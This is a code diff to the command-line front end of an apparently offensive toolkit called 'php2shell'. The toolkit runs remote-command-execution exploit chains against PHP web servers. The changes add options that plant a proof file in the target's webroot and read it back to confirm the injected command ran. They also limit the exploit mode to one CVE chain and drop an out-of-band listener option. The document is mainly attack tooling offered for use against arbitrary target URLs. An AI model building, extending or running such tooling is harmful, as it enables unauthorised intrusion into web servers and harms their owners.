@@ -122,7 +122,16 @@ def _confirm(n: int, args) -> bool:
 
 
 def _hex(v):
-    return int(v, 0) if v else None
+    """Parse a CLI offset ('0x465370', '465370', '0') into int|None."""
+    if v is None or v == "":
+        return None
+    if isinstance(v, int):
+        return v
+    try:
+        return int(str(v), 0)
+    except ValueError:
+        raise SystemExit(f"php2shell: error: bad offset {v!r} "
+                         "(use 0x465370 or 465370)")
 
 
 def _run_exploits(candidates: list[dict], args) -> None:
@@ -138,9 +147,11 @@ def _run_exploits(candidates: list[dict], args) -> None:
 
     cmd = args.cmd
     proof_name = getattr(args, "proof_file", None)
-    if proof_name:
+    proof_lab = bool(getattr(args, "proof_lab", False))
+    if proof_name or proof_lab:
         try:
-            cmd = proof_cmd_for(args.cmd, proof_name)
+            cmd = proof_cmd_for(args.cmd, proof_name or "p1.txt",
+                                lab=proof_lab)
         except ValueError as e:
             for r in candidates:
                 r["exploit"] = {"success": False, "error": str(e)}
@@ -163,6 +174,12 @@ def _run_exploits(candidates: list[dict], args) -> None:
 
     for r in candidates:
         print(f"  -> {r['url']}  chain={args.chain} cmd={cmd!r}", flush=True)
+        # default proof URL: <target>/<name> on the same origin
+        purl = getattr(args, "proof_url", "") or ""
+        if not purl and proof_name:
+            base = r["url"].split("?", 1)[0].rstrip("/")
+            dirpart = base.rsplit("/", 1)[0] if "/" in base.split("://", 1)[-1] else base
+            purl = f"{dirpart}/{proof_name}"
         try:
             res = run_exploit(
                 r["url"], cmd=cmd, chain=args.chain,
@@ -172,13 +189,16 @@ def _run_exploits(candidates: list[dict], args) -> None:
                 htdata_offset=_hex(args.htdata_offset),
                 libphp=args.libphp or "",
                 retries=args.retries or 3,
-                proof_file=proof_name,
+                proof_file=None if proof_lab else (
+                    os.path.join("lab", "out", proof_name) if proof_name else None),
+                proof_url=purl if not proof_lab else "",
+                proof_lab=proof_lab,
                 timeout=args.exploit_timeout,
                 quiet=not args.verbose,
                 log=(lambda m: print(f"     {m}", flush=True)),
                 seed=args.seed, fire=args.fire, gadget=args.gadget,
                 prop=args.prop, php=args.php, probes=args.probes,
-                oob=args.oob, workers=getattr(args, "workers", 1))
+                workers=getattr(args, "workers", 1))
         except RuntimeError as e:
             r["exploit"] = {"success": False, "error": str(e)}
             print(f"     failed: {e}")
@@ -204,7 +224,7 @@ def _write_io(args, records, meta) -> None:
 def cmd_detect(args) -> int:
     _banner(args, mode="detect")
     t = _mk_transport(args)
-    urls = args.urls or load_targets(args.list)
+    urls = args.urls or (load_targets(args.list) if args.list else [])
     if not urls:
         print("no targets", file=sys.stderr)
         return 2
@@ -266,7 +286,7 @@ def cmd_preflight(args) -> int:
 def cmd_scan(args) -> int:
     _banner(args, mode="scan")
     t = _mk_transport(args)
-    urls = args.urls or load_targets(args.list)
+    urls = args.urls or (load_targets(args.list) if args.list else [])
     if not urls:
         print("no targets", file=sys.stderr)
         return 2
@@ -298,6 +318,11 @@ def cmd_scan(args) -> int:
 
 def cmd_exploit(args) -> int:
     _banner(args, mode="exploit")
+    if args.cve not in CVE_SUPPORTED:
+        print(f"php2shell: {args.cve} is not implemented — this toolkit ships "
+              f"the {CVE_SUPPORTED[0]} chain only. Detection for "
+              f"CVE-2026-109618 is `detect`, not `exploit`.", file=sys.stderr)
+        return 2
     url = _require_scheme(args.url)
     t = _mk_transport(args)
     rec = _detect_one(url, t, args)
@@ -315,6 +340,14 @@ def cmd_exploit(args) -> int:
     if not _confirm(1, args):
         print("exploit not confirmed - aborted")
         return 1
+    if not (args.proof_file or args.proof_url or args.proof_lab):
+        print()
+        print("  note: no proof channel requested — pass --proof-file NAME "
+              "(default) or --proof-url URL")
+        print("        so the command output is read back and the result is "
+              "confirmable.")
+        print("        Without it the chain still runs, but success cannot be "
+              "verified from here.")
     _run_exploits([rec], args)
     _write_io(args, [rec], {"mode": "exploit"})
     return 0
@@ -399,13 +432,20 @@ def _add_exploit_flags(p):
                    help="OFFSET profile of the chain (NOT the TLS fingerprint)")
     g.add_argument("--libphp", default="", help="libphp.so to read offsets from (remote chain)")
     g.add_argument("--proof-file", default=None, metavar="NAME",
-                   help="write proof to /out/NAME on target then read it back")
+                   help="proof filename written on the target, read back "
+                        "after firing (default: p1.txt in the PHP cwd, i.e. "
+                        "the webroot — served over HTTP)")
+    g.add_argument("--proof-url", default="",
+                   help="explicit URL to GET for the proof (e.g. "
+                        "http://t/p1.txt). Defaults to <target>/p1.txt")
+    g.add_argument("--proof-lab", action="store_true",
+                   help="write the proof to /out/NAME instead of the cwd — "
+                        "only for the Docker lab where /out is a shared mount")
     g.add_argument("--retries", type=int, default=3, help="retries per stage (default 3)")
     g.add_argument("--probes", type=int, default=20, help="pure chain: probe count (default 20)")
     g.add_argument("--workers", type=int, default=1,
                    help="target prefork MaxRequestWorkers; >1 pins workers-1 "
                         "children so the chain hits one child (pure chain)")
-    g.add_argument("--oob", default="", help="pure chain: OOB listener URL (blind mode)")
     g.add_argument("--seed", default="", help="mismatch chain: seed endpoint")
     g.add_argument("--fire", default="", help="mismatch chain: fire endpoint")
     g.add_argument("--gadget", default="Evil", help="mismatch chain: gadget class name")
